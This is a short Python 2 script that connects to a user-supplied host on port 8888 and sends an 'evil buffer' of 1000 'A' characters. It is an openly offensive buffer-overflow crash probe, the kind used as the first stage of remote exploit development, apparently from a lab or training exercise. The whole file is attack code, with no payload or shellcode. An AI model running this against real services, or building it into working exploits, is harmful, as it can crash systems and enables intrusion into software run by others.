#!/usr/bin/python

import sys, socket

if len(sys.argv) < 2:
    print "\nUsage: " + sys.argv[0] + " <HOST>\n"
    sys.exit()

buffer = "A" * 1000
buffer += "\r\n"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((sys.argv[1], 8888))
print s.recv(1024)
print "Sending evil buffer..."
s.send(buffer)
s.close()



